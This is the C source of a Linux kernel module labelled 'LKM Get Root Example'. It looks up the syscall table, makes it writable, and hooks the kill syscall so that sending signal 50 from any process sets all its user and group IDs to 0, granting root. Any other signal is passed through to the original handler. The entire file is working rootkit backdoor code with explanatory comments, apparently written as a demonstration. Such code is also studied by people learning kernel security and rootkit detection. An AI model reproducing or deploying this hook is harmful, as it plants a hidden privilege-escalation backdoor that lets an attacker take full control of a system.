#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

#include "my_memory.h"

static unsigned long *__sys_call_table;                          //<- Pointer to the Kernel syscall table

asmlinkage int (*original_kill) (const struct pt_regs *regs);

asmlinkage int hooked_kill(const struct pt_regs *regs)
{
        struct cred * credentials;

        pr_info("   Hooked Syscall!!\n");

        if ((int)regs->si == 50)                                   //<- Check if get signal "50"
        {                                                          //<-- It does, then make root
                pr_info("   Modifiying Credentials for Process.\n");

                credentials = prepare_creds();                     //<- Preparing PRocess Credentials to be accessed

                credentials->uid.val =                             //<- Modifiying credentials in the memory copy
                credentials->gid.val =
                credentials->euid.val =
                credentials->egid.val =
                credentials->suid.val =
                credentials->sgid.val =
                credentials->fsuid.val =
                credentials->fsgid.val = 0;

                commit_creds(credentials);                          //<- Make new creds for the process

        } else {                                                    //<-- It doesnt, run original sys_kill

                return original_kill(regs);
        }

        return 0;
}

static int __init lkm_init(void)
{
        pr_info("Loading Module...\n");

        __sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");    

        if (__sys_call_table == NULL) {                                        
                pr_err("  Can't find syscall table!.\n");
                return -EINTR;
        }

        original_kill = (void *) __sys_call_table[__NR_kill];                  

        my_memory_rw();                                                         

        __sys_call_table[__NR_kill] = (unsigned long) hooked_kill;              
                                                                                
        my_memory_ro();

        return 0;
}

static void __exit lkm_exit(void)
{
        pr_info("Exiting... Bye.\n");

        my_memory_rw();

        __sys_call_table[__NR_kill] = (unsigned long) original_kill;             

        my_memory_ro();

}

module_init(lkm_init);           
module_exit(lkm_exit);          

MODULE_AUTHOR("Guillem Alminyana");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM Get Root Example");
